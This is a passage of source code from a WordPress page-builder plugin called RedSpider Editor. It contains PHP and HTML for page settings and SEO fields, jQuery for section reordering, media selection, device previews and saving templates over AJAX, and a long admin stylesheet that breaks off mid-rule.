                <iframe id="rs-preview-iframe" class="rs-preview-desktop" src="<?php echo esc_url(get_permalink($selected_page_id)); ?>"></iframe>
              </div>
            </div>

            <!-- RIGHT SETTINGS PANEL (WordPress Document Settings) -->
            <div class="rs-right-panel">
              <!-- Featured Image Box -->
              <div class="rs-page-settings-box">
                <h4><?php _e('Featured Image', 'redspider-editor'); ?></h4>
                <div class="rs-featured-image-wrapper">
                  <input type="hidden" id="rs-featured-image-id" name="page_thumbnail_id" value="<?php echo esc_attr($thumbnail_id); ?>">
                  <div class="rs-featured-image-preview" id="rs-featured-image-preview">
                    <?php if ($thumbnail_url) : ?>
                      <img src="<?php echo esc_url($thumbnail_url); ?>" style="max-width: 100%; max-height: 150px; display: block; margin: 0 auto 10px;">
                    <?php else : ?>
                      <span class="rs-featured-image-placeholder"><?php _e('No Image Set', 'redspider-editor'); ?></span>
                    <?php endif; ?>
                  </div>
                  <div class="rs-featured-image-actions">
                    <button type="button" class="rs-btn rs-btn-small" id="rs-set-featured-image-btn"><?php _e('Set Image', 'redspider-editor'); ?></button>
                    <button type="button" class="rs-btn rs-btn-small rs-btn-secondary" id="rs-remove-featured-image-btn" style="<?php echo $thumbnail_url ? '' : 'display:none;'; ?>"><?php _e('Remove', 'redspider-editor'); ?></button>
                  </div>
                </div>
              </div>

              <!-- Page Attributes Box -->
              <div class="rs-page-settings-box">
                <h4><?php _e('Page Attributes', 'redspider-editor'); ?></h4>
                <div class="rs-fields-grid">
                  <div class="rs-field-item">
                    <label><?php _e('Template', 'redspider-editor'); ?></label>
                    <select name="page_template" class="rs-styled-select">
                      <option value="default"><?php _e('Default Template', 'redspider-editor'); ?></option>
                      <?php foreach ($page_templates as $temp_label => $temp_file) : ?>
                        <option value="<?php echo esc_attr($temp_file); ?>" <?php selected($current_template, $temp_file); ?>><?php echo esc_html($temp_label); ?></option>
                      <?php endforeach; ?>
                    </select>
                  </div>
                  <div class="rs-field-item">
                    <label><?php _e('Parent Page', 'redspider-editor'); ?></label>
                    <select name="page_parent" class="rs-styled-select">
                      <option value="0"><?php _e('(no parent)', 'redspider-editor'); ?></option>
                      <?php foreach ($all_pages as $p) : 
                        if ($p->ID === $selected_page_id) continue;
                        ?>
                        <option value="<?php echo esc_attr($p->ID); ?>" <?php selected($post->post_parent, $p->ID); ?>><?php echo esc_html($p->post_title); ?></option>
                      <?php endforeach; ?>
                    </select>
                  </div>
                  <div class="rs-field-item">
                    <label><?php _e('Order', 'redspider-editor'); ?></label>
                    <input type="number" name="menu_order" value="<?php echo esc_attr($post->menu_order); ?>" style="width: 100%; background: #fff; color: #1e293b; border: 1px solid #cbd5e1; border-radius: 6px; padding: 8px 12px; box-sizing: border-box; outline: none;">
                  </div>
                </div>
              </div>

              <!-- Permalink Box -->
              <div class="rs-page-settings-box">
                <h4><?php _e('Permalink / Slug', 'redspider-editor'); ?></h4>
                <div class="rs-field-item">
                  <label><?php _e('URL Slug', 'redspider-editor'); ?></label>
                  <input type="text" name="page_slug" value="<?php echo esc_attr($post->post_name); ?>" required>
                </div>
              </div>

              <!-- Yoast & Rank Math SEO Box -->
              <div class="rs-page-settings-box">
                <h4><?php _e('SEO Settings', 'redspider-editor'); ?></h4>
                <div class="rs-fields-grid">
                  <div class="rs-field-item">
                    <label><?php _e('Focus Keyphrase', 'redspider-editor'); ?></label>
                    <input type="text" name="focus_keyword" value="<?php echo esc_attr($seo_focuskw); ?>">
                  </div>
                  <div class="rs-field-item">
                    <label><?php _e('SEO Title', 'redspider-editor'); ?></label>
                    <input type="text" name="seo_title" value="<?php echo esc_attr($seo_title_val); ?>">
                  </div>
                  <div class="rs-field-item">
                    <label><?php _e('Meta Description', 'redspider-editor'); ?></label>
                    <textarea name="seo_metadesc"><?php echo esc_textarea($seo_metadesc_val); ?></textarea>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>

        <script>
        jQuery(document).ready(function($){
          // HTML5 Drag and Drop Section Reordering
          var dragSrcEl = null;

          function handleDragStart(e) {
            $(this).addClass('rs-dragging');
            dragSrcEl = this;
            e.originalEvent.dataTransfer.effectAllowed = 'move';
            e.originalEvent.dataTransfer.setData('text/html', this.outerHTML);
          }

          function handleDragOver(e) {
            if (e.preventDefault) {
              e.preventDefault();
            }
            e.originalEvent.dataTransfer.dropEffect = 'move';
            return false;
          }

          function handleDrop(e) {
            e.stopPropagation();
            if (dragSrcEl !== this) {
              var target = $(this);
              var dragEl = $(dragSrcEl);
              
              if (dragEl.index() < target.index()) {
                dragEl.insertAfter(target);
              } else {
                dragEl.insertBefore(target);
              }
              
              // Apply hover highlight to dropped item
              dragEl.addClass('rs-highlight-temp');
              setTimeout(function(){ dragEl.removeClass('rs-highlight-temp'); }, 600);
            }
            return false;
          }

          function handleDragEnd(e) {
            $('.rs-accordion-item').removeClass('rs-dragging');
          }

          // Bind drag/drop events
          $(document).on('dragstart', '.rs-accordion-item', handleDragStart);
          $(document).on('dragover', '.rs-accordion-item', handleDragOver);
          $(document).on('drop', '.rs-accordion-item', handleDrop);
          $(document).on('dragend', '.rs-accordion-item', handleDragEnd);

          // Accordion header toggle (excluding controls clicks)
          $(document).on('click', '.rs-accordion-header', function(e) {
            if ($(e.target).closest('.rs-accordion-controls, .rs-drag-handle').length) {
              return; // Ignore controls
            }
            
            var target = $('#' + $(this).data('target'));
            var icon = $(this).find('.rs-accordion-icon');
            
            $('.rs-accordion-body').not(target).slideUp(200).parent().removeClass('active');
            $('.rs-accordion-icon').not(icon).text('▼');
            
            target.slideToggle(250, function() {
              if (target.is(':visible')) {
                icon.text('▲');
                target.parent().addClass('active');
              } else {
                icon.text('▼');
                target.parent().removeClass('active');
              }
            });
          });

          // Move section Up button click
          $(document).on('click', '.rs-move-up', function(e) {
            e.stopPropagation();
            var item = $(this).closest('.rs-accordion-item');
            var prev = item.prev('.rs-accordion-item');
            if (prev.length > 0) {
              item.insertBefore(prev).addClass('rs-highlight-temp');
              setTimeout(function(){ item.removeClass('rs-highlight-temp'); }, 600);
            }
          });

          // Move section Down button click
          $(document).on('click', '.rs-move-down', function(e) {
            e.stopPropagation();
            var item = $(this).closest('.rs-accordion-item');
            var next = item.next('.rs-accordion-item');
            if (next.length > 0) {
              item.insertAfter(next).addClass('rs-highlight-temp');
              setTimeout(function(){ item.removeClass('rs-highlight-temp'); }, 600);
            }
          });

          // Duplicate section button click
          $(document).on('click', '.rs-duplicate', function(e) {
            e.stopPropagation();
            var item = $(this).closest('.rs-accordion-item');
            var clone = item.clone(true);
            
            // Clean accordion states on clone
            clone.removeClass('active').find('.rs-accordion-body').hide();
            clone.find('.rs-accordion-icon').text('▼');
            
            clone.insertAfter(item).addClass('rs-highlight-temp');
            setTimeout(function(){ clone.removeClass('rs-highlight-temp'); }, 600);
          });

          // Delete section button click
          $(document).on('click', '.rs-delete', function(e) {
            e.stopPropagation();
            if (confirm('<?php echo esc_js(__("Are you sure you want to delete this section?", "redspider-editor")); ?>')) {
              var item = $(this).closest('.rs-accordion-item');
              item.fadeOut(300, function() {
                item.remove();
              });
            }
          });

          // Open first accordion by default
          $('.rs-accordion-item').first().addClass('active').find('.rs-accordion-body').show().end().find('.rs-accordion-icon').text('▲');

          // Helper to escape HTML in JS
          function escapeHtml(string) {
            return String(string).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
          }

          // Add layout template block dynamically
          $('#rs-add-template-btn').click(function(e) {
            e.preventDefault();
            var slug = $('#rs-template-select').val();
            if (!slug) {
              alert('<?php echo esc_js(__("Please select a layout layout to add.", "redspider-editor")); ?>');
              return;
            }
            
            var html = rsTemplates[slug];
            var label = $('#rs-template-select option:selected').text();
            var count = $('.rs-accordion-item').length;
            var targetId = 'rs-accordion-body-new-' + count;

            var newAccordion = `
              <div class="rs-accordion-item new-section-added" draggable="true" style="display:none; border-color: #2ecc71;">
                <button type="button" class="rs-accordion-header" data-target="${targetId}">
                  <div class="rs-drag-handle" title="Drag to Reorder">⋮⋮</div>
                  <span class="rs-accordion-title">[NEW] ${label}</span>
                  <div class="rs-accordion-controls">
                    <span class="rs-control-btn rs-move-up" title="Move Up">↑</span>
                    <span class="rs-control-btn rs-move-down" title="Move Down">↓</span>
                    <span class="rs-control-btn rs-duplicate" title="Duplicate Section">❐</span>
                    <span class="rs-control-btn rs-delete" title="Delete Section">🗑</span>
                  </div>
                  <span class="rs-accordion-icon">▼</span>
                </button>
                <div id="${targetId}" class="rs-accordion-body">
                  <div class="rs-accordion-content">
                    <div class="rs-new-notice">
                      <strong>✓ Section template loaded successfully!</strong>
                      <p>Save changes to automatically parse and configure editable headings, images, and links inside this section.</p>
                    </div>
                    <textarea name="section_htmls[]" class="rs-section-html" style="display:none;">${escapeHtml(html)}</textarea>
                  </div>
                </div>
              </div>
            `;

            $('.rs-sections-accordion').append(newAccordion);
            var appended = $('.new-section-added');
            appended.fadeIn(400, function() {
              appended.removeClass('new-section-added');
            });
            
            // Scroll editor panel to bottom
            $('.rs-editor-panel').animate({
              scrollTop: $('.rs-sections-accordion')[0].scrollHeight
            }, 500);
          });

          // WP media library handler
          $(document).on('click', '.redspider-upload-btn', function(e) {
            e.preventDefault();
            var button = $(this);
            var index = button.data('index');
            var type = button.data('type');
            
            var custom_uploader = wp.media({
              title: 'Select RedSpider Asset Image',
              button: {
                text: 'Use Selected Image'
              },
              multiple: false
            });

            custom_uploader.on('select', function() {
              var attachment = custom_uploader.state().get('selection').first().toJSON();
              if (type === 'bg_images') {
                $('#bg-img-input-' + index).val(attachment.url);
                $('#bg-img-preview-' + index).attr('src', attachment.url);
              } else {
                $('#img-input-' + index).val(attachment.url);
                $('#img-preview-' + index).attr('src', attachment.url);
              }
            });

            custom_uploader.open();
          });

          // Device Preview Sizing Toggle
          $('.rs-device-btn').click(function() {
            var device = $(this).data('device');
            $('.rs-device-btn').removeClass('active');
            $(this).addClass('active');

            var iframe = $('#rs-preview-iframe');
            iframe.removeClass('rs-preview-desktop rs-preview-tablet rs-preview-mobile');
            
            if (device === 'tablet') {
              iframe.addClass('rs-preview-tablet');
            } else if (device === 'mobile') {
              iframe.addClass('rs-preview-mobile');
            } else {
              iframe.addClass('rs-preview-desktop');
            }
          });

          // Refresh Preview button
          $('.rs-refresh-btn').click(function() {
            var iframe = document.getElementById('rs-preview-iframe');
            iframe.src = iframe.src;
          });

          // Save Section/Page as Template
          function saveTemplate(name, html) {
            var nonce = $('#redspider_editor_nonce').val();
            $.ajax({
              url: ajaxurl,
              type: 'POST',
              data: {
                action: 'redspider_save_custom_template',
                name: name,
                html: html,
                security: nonce
              },
              success: function(response) {
                if (response.success) {
                  // Add to rsTemplates object
                  rsTemplates['custom_' + response.data.slug] = html;
                  
                  // Append to select options group
                  var group = $('#rs-custom-templates-group');
                  group.show().append('<option value="custom_' + response.data.slug + '">' + response.data.name + '</option>');
                  
                  alert('Template "' + response.data.name + '" saved successfully!');
                } else {
                  alert('Error: ' + response.data);
                }
              },
              error: function() {
                alert('AJAX request failed.');
              }
            });
          }

          // Save single section as template
          $(document).on('click', '.rs-save-template', function(e) {
            e.stopPropagation();
            var item = $(this).closest('.rs-accordion-item');
            var html = item.find('.rs-section-html').val();
            
            var name = prompt('Enter a name for this Section Template:');
            if (name && name.trim() !== '') {
              saveTemplate(name, html);
            }
          });

          // Save entire page as template
          $(document).on('click', '#rs-save-page-template-btn', function(e) {
            e.preventDefault();
            
            // Re-concatenate all section HTML textareas
            var pageHtmls = [];
            $('.rs-section-html').each(function() {
              pageHtmls.push($(this).val());
            });
            
            if (pageHtmls.length === 0) {
              alert('No sections available to save.');
              return;
            }
            
            var name = prompt('Enter a name for this Page Template:');
            if (name && name.trim() !== '') {
              var entireHtml = pageHtmls.join('\n\n');
              saveTemplate(name, entireHtml);
            }
          });

          // Update section animation (data-aos attribute)
          $(document).on('change', '.rs-section-animation-select', function() {
            var val = $(this).val();
            var item = $(this).closest('.rs-accordion-item');
            var textarea = item.find('.rs-section-html');
            var html = textarea.val();
            
            // Parse outer-most <section> tag
            var sectionTagRegex = /<section([^>]*)>/i;
            var match = sectionTagRegex.exec(html);
            if (match) {
              var attrs = match[1];
              // Remove existing data-aos
              attrs = attrs.replace(/\s*data-aos=["\'][^"\']*["\']/gi, '');
              // Add new data-aos
              if (val) {
                attrs += ' data-aos="' + val + '"';
              }
              
              var newHtml = html.replace(sectionTagRegex, '<section' + attrs + '>');
              textarea.val(newHtml);
              
              // Refresh preview iframe to trigger entry animation display
              var iframe = document.getElementById('rs-preview-iframe');
              iframe.src = iframe.src;
            }
          });

          // Set featured image
          $('#rs-set-featured-image-btn').click(function(e) {
            e.preventDefault();
            var custom_uploader = wp.media({
              title: 'Select Featured Image',
              button: { text: 'Set Featured Image' },
              multiple: false
            });
            custom_uploader.on('select', function() {
              var attachment = custom_uploader.state().get('selection').first().toJSON();
              $('#rs-featured-image-id').val(attachment.id);
              $('#rs-featured-image-preview').html('<img src="' + attachment.url + '" style="max-width: 100%; max-height: 150px; display: block; margin: 0 auto 10px;">');
              $('#rs-remove-featured-image-btn').show();
            });
            custom_uploader.open();
          });

          // Remove featured image
          $('#rs-remove-featured-image-btn').click(function(e) {
            e.preventDefault();
            $('#rs-featured-image-id').val('0');
            $('#rs-featured-image-preview').html('<span class="rs-featured-image-placeholder">No Image Set</span>');
            $(this).hide();
          });
        });
        </script>
      <?php endif; ?>

    </div>
  </div>

  <?php redspider_editor_print_styles(); ?>
  <?php
}

// Reusable stylesheet function
function redspider_editor_print_styles()
{
  ?>
  <style>
    /* ── Elementor-like Full Screen Page Builder Layout ── */
    body.toplevel_page_redspider-editor #adminmenuback,
    body.toplevel_page_redspider-editor #adminmenuwrap,
    body.toplevel_page_redspider-editor #wpadminbar,
    body.toplevel_page_redspider-editor #wpfooter {
      display: none !important;
    }
    body.toplevel_page_redspider-editor #wpcontent,
    body.toplevel_page_redspider-editor #wpbody {
      margin-left: 0 !important;
      padding: 0 !important;
    }
    body.toplevel_page_redspider-editor html.wp-toolbar {
      padding-top: 0 !important;
    }
    body.toplevel_page_redspider-editor #wpbody-content {
      padding-bottom: 0 !important;
    }

    .rs-editor-wrap {
      margin: 0 !important;
      padding: 0 !important;
      max-width: 100% !important;
      width: 100vw !important;
      height: 100vh !important;
      overflow: hidden !important;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
      background: #f5f6f8 !important;
    }
    .rs-editor-card {
      background: #f5f6f8 !important;
      color: #1e293b;
      padding: 0 !important;
      border-radius: 0 !important;
      border: none !important;
      box-shadow: none !important;
      height: 100vh !important;
      display: flex !important;
      flex-direction: column !important;
      overflow: hidden !important;
    }
    .rs-editor-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
      background: #ffffff;
      border-bottom: 1px solid #e2e8f0;
      padding: 10px 25px !important;
      height: 70px;
      min-height: 70px;
      box-sizing: border-box;
      flex-shrink: 0;
      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
    }
    .rs-header-branding {
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .rs-logo-badge {
      background: #DE1515;
      color: #fff;
      font-size: 20px;
      font-weight: 800;
      width: 42px;
      height: 42px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 15px rgba(222, 21, 21, 0.3);
      flex-shrink: 0;
    }
    .rs-header-branding h2 {
      color: #1e293b;
      font-size: 16px;
      font-weight: 700;
      margin: 0;
      line-height: 1.2;
    }
    .rs-header-branding p {
      color: #64748b;
      margin: 2px 0 0 0;
      font-size: 11px;
    }
    .rs-selector-section {
      background: transparent !important;
      padding: 0 !important;
      border: none !important;
      margin-bottom: 0 !important;
      display: flex !important;
      align-items: center !important;
      gap: 15px !important;
    }
    .rs-selector-section form {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .rs-selector-section label {
      display: block;
      font-weight: 700;
      margin-bottom: 0 !important;
      color: #64748b;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      white-space: nowrap;
    }
    .rs-select-wrapper select {
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      padding: 6px 12px;
      font-size: 13px;
      border-radius: 6px;
      width: 220px;
      height: 36px;
      line-height: 1.5;
      box-sizing: border-box;
      outline: none;
      transition: all 0.2s;
    }
    .rs-select-wrapper select:focus {
      border-color: #DE1515;
      box-shadow: 0 0 0 2px rgba(222, 21, 21, 0.1);
    }
    /* Legible dropdown menu options */
    .rs-editor-wrap select option,
    .rs-frontend-drawer select option {
      background-color: #ffffff !important;
      color: #1e293b !important;
    }
    .rs-alert {
      padding: 10px 20px;
      border-radius: 0;
      margin-bottom: 0;
      font-size: 13px;
      display: flex;
      align-items: center;
      gap: 10px;
      background: rgba(46, 204, 113, 0.1);
      border-bottom: 1px solid #2ecc71;
      color: #27ae60;
      position: absolute;
      top: 70px;
      left: 0;
      width: 100%;
      z-index: 99999;
      box-sizing: border-box;
    }
    .rs-alert-icon {
      font-weight: bold;
      font-size: 16px;
    }
    .rs-top-actions .rs-btn {
      height: 36px;
    }

    /* SPLIT CONTAINER LAYOUT */
    .rs-builder-container {
      display: flex !important;
      flex-direction: row !important;
      width: 100vw !important;
      height: calc(100vh - 70px) !important;
      gap: 0 !important;
      overflow: hidden !important;
    }
    .rs-editor-panel {
      width: 420px !important;
      min-width: 420px !important;
      max-width: 420px !important;
      height: 100% !important;
      max-height: 100% !important;
      overflow-y: auto !important;
      background: #ffffff !important;
      border-right: 1px solid #e2e8f0 !important;
      padding: 20px 20px 80px 20px !important;
      box-sizing: border-box !important;
    }
    /* Custom scrollbar for editor panel and drawer */
    .rs-editor-panel::-webkit-scrollbar,
    .rs-drawer-scrollable::-webkit-scrollbar {
      width: 6px;
    }
    .rs-editor-panel::-webkit-scrollbar-track,
    .rs-drawer-scrollable::-webkit-scrollbar-track {
      background: #f1f5f9;
    }
    .rs-editor-panel::-webkit-scrollbar-thumb,
    .rs-drawer-scrollable::-webkit-scrollbar-thumb {
      background: #cbd5e1;
      border-radius: 3px;
    }
    .rs-editor-panel::-webkit-scrollbar-thumb:hover,
    .rs-drawer-scrollable::-webkit-scrollbar-thumb:hover {
      background: #DE1515;
    }

    .rs-preview-panel {
      flex-grow: 1 !important;
      height: 100% !important;
      background: #f1f5f9 !important;
      border: none !important;
      border-radius: 0 !important;
      box-shadow: none !important;
      display: flex !important;
      flex-direction: column !important;
      position: static !important;
      overflow: hidden !important;
    }

    /* Page Settings Box */
    .rs-page-settings-box {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      padding: 15px 20px;
      margin-bottom: 20px;
    }
    .rs-page-settings-box h4 {
      color: #DE1515;
      font-size: 12px;
      font-weight: 700;
      margin: 0 0 12px 0;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .rs-styled-select {
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      border-radius: 6px;
      padding: 9px 12px;
      font-size: 13px;
      width: 100%;
      height: 38px;
      outline: none;
      transition: all 0.2s;
    }
    .rs-styled-select:focus {
      border-color: #DE1515;
      box-shadow: 0 0 0 2px rgba(222, 21, 21, 0.1);
    }

    /* Accordion Custom Styling */
    .rs-accordion-item {
      background: #ffffff;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      margin-bottom: 12px;
      overflow: hidden;
      transition: border-color 0.2s, box-shadow 0.2s, opacity 0.2s;
      color: #1e293b;
    }
    .rs-accordion-item.rs-dragging {
      opacity: 0.4;
      border: 2px dashed #DE1515;
      background: #fef2f2;
    }
    .rs-accordion-item.active {
      border-color: #DE1515;
      box-shadow: 0 4px 15px rgba(222, 21, 21, 0.08);
    }
    .rs-accordion-header {
      width: 100%;
      background: #f8fafc;
      border: none;
      padding: 12px 15px;
      text-align: left;
      color: #1e293b;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
      transition: background 0.2s;
      outline: none;
      border-bottom: 1px solid #e2e8f0;
    }
    .rs-accordion-header:hover {
      background: #f1f5f9;
    }
    .rs-drag-handle {
      color: #94a3b8;
      margin-right: 10px;
      font-size: 14px;
      cursor: move;
      user-select: none;
      transition: color 0.2s;
    }
    .rs-drag-handle:hover {
      color: #DE1515;
    }
    .rs-accordion-title {
      flex-grow: 1;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      margin-right: 10px;
      font-size: 13px;
      color: #1e293b;
    }
    .rs-accordion-controls {
      display: flex;
      gap: 4px;
      margin-right: 10px;
    }
    .rs-control-btn {
      background: #f1f5f9;
      color: #64748b;
      width: 24px;
      height: 24px;
      border-radius: 4px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-size: 10px;
      transition: all 0.2s;
      cursor: pointer;
    }
    .rs-control-btn:hover {
      background: #DE1515;
      color: #fff;
    }
    .rs-control-btn.rs-delete:hover {
      background: #e74c3c;
      color: #fff;
    }
    .rs-accordion-icon {
      font-size: 10px;
      color: #94a3b8;
    }
    .rs-accordion-body {
      display: none;
      border-top: 1px solid #e2e8f0;
      background: #ffffff;
    }
    .rs-accordion-content {
      padding: 15px 20px;
    }
    .rs-group-container {
      margin-bottom: 20px;
      border-bottom: 1px solid #f1f5f9;
      padding-bottom: 15px;
    }
    .rs-group-container:last-child {
      margin-bottom: 0;
      border-bottom: none;
      padding-bottom: 0;
    }
    .rs-group-title {
      color: #DE1515;
      font-size: 12px;
      font-weight: 700;
      margin: 0 0 12px 0;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .rs-fields-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 12px;
    }
    .rs-field-item label {
      display: block;
      font-size: 11px;
      color: #64748b;
      margin-bottom: 5px;
      text-transform: uppercase;
      letter-spacing: 0.3px;
    }
    .rs-field-item input[type="text"],
    .rs-field-item textarea {
      width: 100%;
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      border-radius: 6px;
      padding: 8px 12px;
      font-size: 13px;
      box-sizing: border-box;
      outline: none;
      transition: all 0.2s;
    }
    .rs-field-item input[type="text"]:focus,
    .rs-field-item textarea:focus {
      border-color: #DE1515;
      background: #ffffff;
      box-shadow: 0 0 0 2px rgba(222, 21, 21, 0.1);
    }
    .rs-field-item textarea {
      min-height: 70px;
      resize: vertical;
    }
    .rs-images-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 12px;
    }
    .rs-image-card {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      padding: 10px;
      display: flex;
      gap: 10px;
      align-items: center;
    }
    .rs-image-preview {
      width: 60px;
      height: 60px;
      background: #f1f5f9;
      border: 1px solid #cbd5e1;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      flex-shrink: 0;
    }
    .rs-image-preview img {
      max-width: 100%;
      max-height: 100%;
      object-fit: contain;
    }
    .rs-image-details {
      flex-grow: 1;
    }
    .rs-image-details label {
      display: block;
      font-size: 10px;
      color: #64748b;
      margin-bottom: 4px;
      text-transform: uppercase;
    }
    .rs-image-details input[type="text"] {
      width: 100%;
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      border-radius: 4px;
      padding: 5px 8px;
      font-size: 11px;
      margin-bottom: 6px;
      box-sizing: border-box;
      outline: none;
    }
    .rs-image-details input[type="text"]:focus {
      border-color: #DE1515;
    }
    .rs-btn {
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      border-radius: 6px;
      padding: 8px 16px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s;
      outline: none;
    }
    .rs-btn:hover {
      background: #f1f5f9;
      border-color: #cbd5e1;
      color: #1e293b;
    }
    .rs-btn-small {
      padding: 4px 10px;
      font-size: 10px;
      border-radius: 4px;
    }
    .rs-btn-secondary {
      background: #ffffff;
      border-color: #cbd5e1;
      color: #64748b;
      height: 36px;
      box-sizing: border-box;
    }
    .rs-btn-secondary:hover {
      border-color: #DE1515;
      color: #DE1515;
    }
    .rs-btn-primary {
      background: #DE1515;
      border-color: #DE1515;
      color: #fff;
    }
    .rs-btn-primary:hover {
      background: #c00f0f;
      border-color: #c00f0f;
    }
    .rs-btn-large {
      padding: 10px 25px;
      font-size: 14px;
      box-shadow: 0 4px 15px rgba(222, 21, 21, 0.2);
    }
    .rs-add-section-area {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      padding: 15px 20px;
      margin-top: 25px;
    }
    .rs-add-section-area h4 {
      margin: 0 0 3px 0;
      color: #1e293b;
      font-size: 14px;
      font-weight: 600;
    }
    .rs-add-section-area p {
      margin: 0 0 12px 0;
      color: #64748b;
      font-size: 11px;
    }
    .rs-add-section-controls {
      display: flex;
      gap: 10px;
    }
    .rs-add-section-controls select {
      background: #ffffff;
      color: #1e293b;
      border: 1px solid #cbd5e1;
      padding: 6px 10px;
      font-size: 13px;
      border-radius: 6px;
      flex-grow: 1;
      max-width: 250px;
      outline: none;
    }
    .rs-add-section-controls select:focus {
      border-color: #DE1515;
    }
    .rs-new-notice {
      background: rgba(46, 204, 113, 0.1);
      border: 1px solid #2ecc71;
      color: #27ae60;
      padding: 12px;
      border-radius: 6px;
      margin-bottom: 0;
    }
    .rs-new-notice strong {
      display: block;
      font-size: 12px;
      margin-bottom: 3px;
    }
    .rs-new-notice p {
      margin: 0;
      font-size: 11px;
      color: #27ae60;
    }
    .rs-highlight-temp {
      border-color: #DE1515 !important;
      box-shadow: 0 0 12px rgba(222, 21, 21, 0.6) !important;
    }
    .rs-editor-footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 420px;
      background: #ffffff;
      padding: 15px 20px;
      box-sizing: border-box;
      border-top: 1px solid #e2e8f0;
      z-index: 9999;
    }
    .rs-muted {
      color: #94a3b8;
      font-weight: normal;
    }

    /* PREVIEW CONTAINER STYLING */
    .rs-preview-header {
      background: #ffffff;
      padding: 10px 25px;
      border-bottom: 1px solid #e2e8f0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      height: 50px;
      min-height: 50px;
      box-sizing: border-box;
    }
    .rs-preview-title {
      font-weight: 700;
      color: #1e293b;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .rs-device-controls {
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .rs-device-btn {
      background: #f1f5f9;
      color: #64748b;
      border: 1px solid #cbd5e1;
      border-radius: 4px;
      padding: 5px 12px;
      font-size: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .rs-device-btn:hover,
    .rs-device-btn.active {
      background: #DE1515;
      border-color: #DE1515;
      color: #fff;
    }
    .rs-refresh-btn {
      background: #f1f5f9;
      color: #64748b;
      border: 1px solid #cbd5e1;
      border-radius: 4px;
      padding: 5px 10px;
      font-size: 10px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .rs-refresh-btn:hover {
      background: #1e293b;
      color: #ffffff;
      border-color: #1e293b;
    }
    .rs-preview-iframe-wrapper {
      background: #cbd5e1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 25px !important;
      height: calc(100% - 50px) !important;
      box-sizing: border-box !important;
      overflow: hidden;
    }
    #rs-preview-iframe {
      border: none;
      background: #fff;
      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
      border-radius: 6px;
      width: 100%;
      height: 100%;
      transition: width 0.3s ease, height 0.3s ease;
    }
    .rs-preview-desktop {
      width: 100%;
      max-width: 100%;
    }
    .rs-preview-tablet {
      width: 768px !important;
      height: 95% !important;
    }
    .rs-preview-mobile {
      width: 375px !important;
      height: 667px !important;
    }
    .d-flex {
      display: flex !important;
    }
    .gap-2 {
      gap: 8px !important;
    }

    /* ── Frontend Edit FAB Button ── */
    .rs-frontend-edit-fab {
      position: fixed;
      bottom: 25px;
      right: 25px;
      background: #DE1515;
      color: #fff;
      padding: 12px 20px;
      border-radius: 50px;
      box-shadow: 0 5px 25px rgba(222, 21, 21, 0.4);
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 10px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      font-weight: 700;
      font-size: 14px;
      z-index: 999998;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .rs-frontend-edit-fab:hover {
      background: #c00f0f;
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 8px 30px rgba(222, 21, 21, 0.6);
    }
    .rs-fab-icon {
      font-weight: 900;
      background: #fff;
      color: #DE1515;
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
    }
    .rs-fab-text {
      text-decoration: none;
      color: #fff;
    }

    /* ── Frontend Drawer Slide Panel ── */
    .rs-frontend-drawer {
      position: fixed;
      top: 0;
      left: -425px;
      width: 420px;
      height: 100vh;
      background: #ffffff;
      box-shadow: 5px 0 25px rgba(0,0,0,0.15);
      z-index: 999999;
      display: flex;
      flex-direction: column;
      color: #1e293b;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      transition: left 0.3s ease;
      box-sizing: border-box;
      border-right: 1px solid #e2e8f0;
    }
    .rs-frontend-drawer.rs-drawer-open {
      left: 0;
    }
    .rs-drawer-header {
      background: #ffffff;
      border-bottom: 1px solid #e2e8f0;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 70px;
      min-height: 70px;
